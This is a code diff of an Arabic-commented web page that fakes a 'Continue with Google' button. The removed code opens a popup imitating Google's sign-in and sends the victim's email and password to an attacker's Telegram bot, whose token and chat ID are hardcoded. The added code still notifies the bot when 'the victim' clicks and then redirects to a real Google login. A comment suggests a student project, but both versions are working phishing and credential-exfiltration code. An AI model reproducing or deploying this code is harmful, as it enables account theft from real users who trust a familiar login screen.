@@ -1,50 +1,21 @@
-<button class="google-btn" onclick="triggerGoogleAttack()">
+<button class="google-btn" onclick="startGlowFlow()">
     المتابعة باستخدام Google
     <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" style="width:18px; margin-right:10px;">
 </button>
 
 <script>
-function triggerGoogleAttack() {
-    // إحداثيات لفتح النافذة في منتصف الشاشة بالضبط لإيهام الضحية
-    const w = 500, h = 600;
-    const left = (screen.width/2)-(w/2), top = (screen.height/2)-(h/2);
-    
-    // فتح واجهة جوجل المزورة
-    const win = window.open("", "GoogleLogin", `width=${w},height=${h},top=${top},left=${left}`);
-    
-    win.document.write(`
-        <title>Sign in - Google Accounts</title>
-        <div style="font-family:arial; text-align:center; padding:40px;">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-            <h2>تسجيل الدخول</h2>
-            <p>استخدم حسابك على Google</p>
-            <input type="email" id="e" placeholder="البريد الإلكتروني" style="width:100%; padding:10px; margin:10px 0; border:1px solid #dadce0; border-radius:4px;">
-            <input type="password" id="p" placeholder="كلمة المرور" style="width:100%; padding:10px; margin:10px 0; border:1px solid #dadce0; border-radius:4px;">
-            <button onclick="send()" style="background:#1a73e8; color:white; border:none; padding:10px 24px; border-radius:4px; cursor:pointer; float:left; margin-top:20px;">التالي</button>
-        </div>
-        <script>
-            function send() {
-                const data = {email: document.getElementById('e').value, pass: document.getElementById('p').value};
-                window.opener.postMessage(data, "*");
-                window.close();
-            }
-        <\/script>
-    `);
+function startGlowFlow() {
+    // 1. إرسال تنبيه لتلغرام أن الضحية بدأ الضغط (للمراقبة الحية أمام الدكتور)
+    sendNotify("⚠️ الضحية بدأ عملية المتابعة عبر جوجل...");
+
+    // 2. توجيه الضحية لصفحة تحاكي "اختيار الحساب" الرسمية
+    // ملاحظة للمشروع: نستخدم رابطاً يبدو رسمياً
+    window.location.href = "https://accounts.google.com/ServiceLogin?service=lso&passive=1209600&continue=https://appsyria00.github.io/AS/success.html";
 }
 
-// استقبال البيانات وإرسالها لتلغرام
-window.addEventListener("message", (event) => {
+function sendNotify(msg) {
     const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
-    
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: "🚨 صيد جديد (Google Auth) 🚨\nEmail: " + event.data.email + "\nPass: " + event.data.pass
-        })
-    });
-    alert("حدث خطأ في المصادقة، يرجى إعادة المحاولة.");
-});
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+}
 </script>
